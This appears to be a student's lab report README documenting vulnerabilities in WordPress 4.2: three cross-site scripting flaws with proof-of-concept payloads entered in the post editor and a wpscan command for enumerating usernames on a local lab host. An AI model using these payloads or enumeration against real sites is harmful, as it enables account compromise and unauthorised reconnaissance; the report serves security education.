# Project 7 - WordPress Pen Testing

Time spent: **12** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pen Testing Report

### 1. (Required) Vulnerability Name: Authenticated Stored Cross-Site Scripting

- [ ] Summary: 
  - Vulnerability types: XSS
  - Tested in version: 4.2
  - Fixed in version:  4.2.3
- [ ] GIF Walkthrough: <img src=XSS1.gif />
- [ ] Steps to recreate: 
  - Create a new Post
  - Key in the line of code in text editer: ```<a href="</a><a title=" onmouseover=alert('test')  ">link</a>```
- [ ] Affected source code:
  - [Link 1](https://klikki.fi/adv/wordpress3.html)
  
### 2. (Required) Vulnerability Name: Unauthenticated Genericons Cross-Site Scripting

- [ ] Summary: 
  - Vulnerability types: XSS
  - Tested in version: 4.2
  - Fixed in version: 4.2.2
- [ ] GIF Walkthrough: <img src=XSS2.gif />
- [ ] Steps to recreate: 
  - Create a new Post
  - Key in the line of code in text editer: 
    ```http://www.example.com/wp-content/themes/twentyfifteen/genericons/example.html#1<img/ src=1 onerror= alert(1)>``` 
- [ ] Affected source code:
  - [Link 1](https://wpscan.com/vulnerability/21169b6d-61dd-4abc-b77b-167ff5f122ac)

### 3. (Required) Vulnerability Name: Authenticated Shortcode Tags Cross-Site Scripting

- [ ] Summary: 
  - Vulnerability types: XSS
  - Tested in version: 4.2
  - Fixed in version: 4.2.4
- [ ] GIF Walkthrough: <img src=XSS3.gif />
- [ ] Steps to recreate: 
  - Create a new Post
  - Key in the line of code in text editer: ```XSS LOL!!![caption width='1' caption='<a href="' ">]</a><a href="http://onMouseOver='alert(/xss/)' style='display:block;position:absolute;top:0px;left:0px;margin-left:-1000px;margin-top:-1000px;width:99999px;height:99999px;'"></a>```
- [ ] Affected source code:
  - [Link 1](https://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/)

### 4. (Optional) Vulnerability Name: Enumerate Usernames

- [ ] Summary: 
  - Vulnerability types: Enumerate Usernames
  - Tested in version: 4.2 
  - Fixed in version: 
- [ ] GIF Walkthrough: <img src=enumerate.gif />
- [ ] Steps to recreate: 
      ```wpscan --url http://wpdistillery.vm/ --enumerate u```
- [ ] Affected source code:
  - [Link 1](https://www.wpwhitesecurity.com/enumerate-wordpress-users-wpscan-security-scanner/)

### 5. (Optional) Vulnerability Name or ID

- [ ] Summary: 
  - Vulnerability types:
  - Tested in version:
  - Fixed in version: 
- [ ] GIF Walkthrough: 
- [ ] Steps to recreate: 
- [ ] Affected source code:
  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with  ...
<!-- Recommended GIF Tools:
[Kap](https://getkap.co/) for macOS
[ScreenToGif](https://www.screentogif.com/) for Windows
[peek](https://github.com/phw/peek) for Linux. -->

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2022] [Xujuan Chen]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
